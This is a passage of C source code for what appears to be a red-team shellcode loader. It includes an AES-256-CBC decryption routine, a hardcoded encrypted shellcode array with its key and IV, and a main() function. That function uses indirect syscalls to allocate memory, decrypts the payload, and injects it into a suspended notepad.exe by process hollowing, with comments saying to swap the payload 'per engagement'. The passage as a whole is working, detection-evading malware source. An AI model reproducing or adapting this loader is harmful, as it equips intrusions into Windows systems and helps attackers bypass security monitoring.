		col[3] = gf_mul(a0, 11) ^ gf_mul(a1, 13) ^ gf_mul(a2, 9) ^ gf_mul(a3, 14);
	}
}

static void KeyExpansion256(const unsigned char key[32], unsigned char w[240]) {
	unsigned char temp[4];
	unsigned char rcon = 0x01;
	int i;
	for (i = 0; i < 8; i++) {
		w[4 * i] = key[4 * i];
		w[4 * i + 1] = key[4 * i + 1];
		w[4 * i + 2] = key[4 * i + 2];
		w[4 * i + 3] = key[4 * i + 3];
	}
	for (i = 8; i < 60; i++) {
		temp[0] = w[4 * (i - 1)];
		temp[1] = w[4 * (i - 1) + 1];
		temp[2] = w[4 * (i - 1) + 2];
		temp[3] = w[4 * (i - 1) + 3];
		if (i % 8 == 0) {
			/* RotWord -> SubWord -> XOR Rcon */
			unsigned char t = temp[0];
			temp[0] = s_sbox[temp[1]] ^ rcon;
			temp[1] = s_sbox[temp[2]];
			temp[2] = s_sbox[temp[3]];
			temp[3] = s_sbox[t];
			rcon = xtime_f(rcon);
		}
		else if (i % 8 == 4) {
			/* SubWord on every 8th word (AES-256 extra step) */
			temp[0] = s_sbox[temp[0]];
			temp[1] = s_sbox[temp[1]];
			temp[2] = s_sbox[temp[2]];
			temp[3] = s_sbox[temp[3]];
		}
		w[4 * i] = w[4 * (i - 8)] ^ temp[0];
		w[4 * i + 1] = w[4 * (i - 8) + 1] ^ temp[1];
		w[4 * i + 2] = w[4 * (i - 8) + 2] ^ temp[2];
		w[4 * i + 3] = w[4 * (i - 8) + 3] ^ temp[3];
	}
}

static void InvCipher(unsigned char state[16], const unsigned char* w) {
	int round;
	AddRoundKey(state, w + 16 * 14);
	for (round = 13; round >= 1; round--) {
		InvShiftRows(state);
		InvSubBytes(state);
		AddRoundKey(state, w + 16 * round);
		InvMixColumns(state);
	}
	InvShiftRows(state);
	InvSubBytes(state);
	AddRoundKey(state, w);
}

/*
 * AES-256-CBC decrypt (PKCS#7).  src/dst may be the same buffer.
 * Returns the unpadded plaintext length, or 0 on failure.
 */
static size_t AES256CBCDecrypt(unsigned char* dst, const unsigned char* src,
	size_t len, const unsigned char key[32],
	const unsigned char iv[16]) {
	unsigned char w[240];
	unsigned char prev[16], ct[16], pt[16];
	unsigned char pad;
	size_t i;
	if (len == 0 || (len % 16) != 0) return 0;
	KeyExpansion256(key, w);
	memcpy(prev, iv, 16);
	for (i = 0; i < len; i += 16) {
		memcpy(ct, src + i, 16);
		memcpy(pt, ct, 16);
		InvCipher(pt, w);
		for (int j = 0; j < 16; j++) dst[i + j] = pt[j] ^ prev[j];
		memcpy(prev, ct, 16);
	}
	pad = dst[len - 1];
	if (pad == 0 || pad > 16) return 0;
	for (i = len - pad; i < len; i++)
		if (dst[i] != pad) return 0;
	return len - pad;
}

/* ================================================================ *
 * AES-256-CBC encrypted shellcode + material                       *
 * Generated with: python3 encryptor.py <shellcode.bin>             *
 * Regenerate and replace the three arrays below per engagement.    *
 * ================================================================ */
static const unsigned char Payload[288] = {
	0x0F, 0x53, 0x26, 0xB4, 0xBD, 0xE5, 0xD1, 0x57, 0x0A, 0xC6, 0xE1, 0x3E,
	0xFE, 0x25, 0x7E, 0x18, 0x7D, 0x78, 0xF0, 0xC6, 0xA0, 0x5D, 0x90, 0xE8,
	0xA6, 0x06, 0x79, 0xD7, 0xE6, 0x63, 0xFA, 0xB5, 0xFB, 0x6D, 0x09, 0x4B,
	0x68, 0xA4, 0x9E, 0x83, 0x62, 0x7B, 0xB3, 0x4F, 0x9F, 0xF2, 0x8F, 0xBE,
	0x80, 0xE4, 0x22, 0xE4, 0x35, 0x23, 0x8B, 0x39, 0xA4, 0x67, 0xAC, 0x33,
	0x45, 0x9F, 0x1A, 0xC9, 0xA6, 0x28, 0x4A, 0xA9, 0x45, 0xF4, 0x32, 0xD5,
	0x08, 0xF0, 0xB9, 0x7A, 0xA2, 0xAB, 0x13, 0xD8, 0x1E, 0xC1, 0x42, 0x5A,
	0x4E, 0xA5, 0xF2, 0xCD, 0xD6, 0xC2, 0xF4, 0x2D, 0xDE, 0x70, 0xBD, 0x65,
	0x3D, 0x13, 0x1E, 0x8A, 0x04, 0xE3, 0xA4, 0x05, 0xD8, 0x3C, 0xDD, 0x6E,
	0x1C, 0xC5, 0x0F, 0x6F, 0x59, 0xB1, 0xBD, 0x53, 0xF7, 0x98, 0x03, 0xB9,
	0xF4, 0xA1, 0x27, 0x98, 0xE1, 0xD1, 0x9B, 0xB8, 0xAF, 0xCD, 0x32, 0xDB,
	0x6F, 0x92, 0x83, 0x37, 0x68, 0x2E, 0x71, 0x84, 0xBA, 0x4D, 0xD3, 0x2D,
	0xBA, 0x9A, 0x39, 0x4F, 0x49, 0xC8, 0x9F, 0x5B, 0xBD, 0x27, 0x7D, 0x11,
	0x61, 0x4E, 0x99, 0xDD, 0xE2, 0xEB, 0x6A, 0xC8, 0x58, 0x7F, 0x47, 0xC0,
	0xDE, 0xAB, 0x4E, 0x65, 0x0E, 0x48, 0x0D, 0x07, 0xFE, 0x45, 0x1C, 0x93,
	0xBF, 0xEF, 0x84, 0xE8, 0x7A, 0x52, 0x29, 0x78, 0x8B, 0x26, 0x04, 0x3A,
	0x65, 0xDE, 0x44, 0x1F, 0xF1, 0x23, 0x97, 0xCD, 0x9E, 0x91, 0x4E, 0x06,
	0x29, 0x61, 0x95, 0x40, 0x74, 0xFD, 0xE6, 0x9A, 0x72, 0x37, 0x71, 0xB8,
	0xB0, 0x2E, 0x65, 0x01, 0x82, 0xAF, 0xEC, 0xA4, 0x0D, 0x0B, 0xD7, 0x6F,
	0x5C, 0x32, 0x6B, 0xE6, 0xD3, 0xB2, 0x5E, 0x78, 0xF9, 0xF4, 0x0D, 0xE5,
	0xEC, 0xEA, 0x43, 0x9B, 0x3E, 0x13, 0x93, 0x25, 0x59, 0x2A, 0x60, 0xA0,
	0x20, 0x71, 0x23, 0x95, 0xB9, 0x8D, 0x0E, 0x01, 0xCB, 0x57, 0x24, 0x3F,
	0xC3, 0x13, 0x03, 0xEF, 0xC4, 0x35, 0xB1, 0x87, 0xE0, 0x85, 0xCB, 0xDD,
	0x5C, 0xC4, 0x9B, 0xDA, 0x58, 0x9B, 0xEE, 0x04, 0x45, 0x58, 0xCB, 0x0A,
};

static const unsigned char g_AesKey[32] = {
	0xD3, 0x21, 0xCC, 0xED, 0x2F, 0xA9, 0x45, 0xBD, 0x8D, 0xA4, 0xF3, 0x9F,
	0xC2, 0xAC, 0xAA, 0x4E, 0x04, 0x08, 0xEC, 0xCA, 0x6F, 0xD8, 0x5A, 0x3B,
	0x10, 0x38, 0x7F, 0xDB, 0x34, 0xC4, 0x54, 0x1A,
};

static const unsigned char g_AesIv[16] = {
	0x04, 0x00, 0xD0, 0x32, 0x90, 0x23, 0xE6, 0x38, 0xA1, 0x77, 0xA2, 0x7A,
	0x79, 0xB3, 0xA7, 0xE9,
};

int main() {

	NTSTATUS STATUS = 0;
	PVOID pAddress = NULL;
	SIZE_T sSize = sizeof(Payload);
	HANDLE hProcess = (HANDLE)-1;

	if (!InitSyscalls()) {
		return -1;
	}

	// [1] Allocate a local RW staging buffer for the decrypted payload.
	SetSSn(g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.pSyscallInstAddress);
	if (!NT_SUCCESS(STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) || pAddress == NULL) {
		return -1;
	}

	// [2] Decrypt the AES-256-CBC payload directly into the RW region.
	//     The embedded array stays ciphertext for the lifetime of the image.
	sSize = AES256CBCDecrypt(pAddress, Payload, sizeof(Payload), g_AesKey, g_AesIv);
	if (sSize == 0) {
		return -1;
	}

	// [3] Hollow a suspended notepad.exe and run the decrypted payload inside it.
	if (!HollowAndExecute((PBYTE)pAddress, sSize)) {
		return -1;
	}



	return 0;

}
